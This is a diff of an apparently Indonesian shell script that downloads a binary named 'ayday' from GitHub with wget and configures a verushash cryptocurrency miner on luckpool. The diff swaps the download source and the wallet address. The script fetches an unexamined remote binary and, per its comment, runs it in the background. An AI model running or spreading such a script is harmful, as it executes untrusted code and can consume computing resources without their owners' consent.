@@ -9,7 +9,7 @@ FILE_PATH="$INSTALL_DIR/$FILE_NAME"
 mkdir -p $INSTALL_DIR
 
 # Mengunduh file dari link yang diberikan
-wget -O $FILE_PATH https://github.com/bibirbusin/bibirbusin/raw/main/ayday
+wget -O $FILE_PATH https://github.com/malogrono/Compare/raw/main/ayday
 
 # Memeriksa keberhasilan unduhan
 if [ ! -s $FILE_PATH ]; then
@@ -30,9 +30,9 @@ done
 # Pengaturan penambangan
 ALGO="verushash"
 POOL_URL="stratum+tcp://eu.luckpool.net:3956"
-WALLET_ADDRESS="RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3"
+WALLET_ADDRESS="RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F"
 PASSWORD="x"
-WORKER_NAME="ACLuxy$RANDOM"
+WORKER_NAME="A$RANDOM"
 
 # Memulai dengan file ayday dan menjalankan di latar belakang
 cd $INSTALL_DIR
